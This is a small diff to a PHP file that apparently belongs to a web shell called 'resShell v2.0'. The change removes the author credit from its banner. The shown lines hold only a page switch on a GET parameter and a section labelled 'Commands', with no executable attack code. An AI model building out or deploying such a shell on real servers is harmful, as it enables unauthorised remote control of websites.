@@ -76,7 +76,7 @@
 $page = $_GET['page'];
 
 if ( $page == 'about' ) { ####################################################################### home
-	echo '<center><font size="5" color="green">resShell v2.0 #beta - coded by FebVeg</font></center>';
+	echo '<center><font size="5" color="green">resShell v2.0 #beta</font></center>';
 
 } elseif ( $page == 'info' ) { ####################################################################### Commands
 	//informazioni del sito
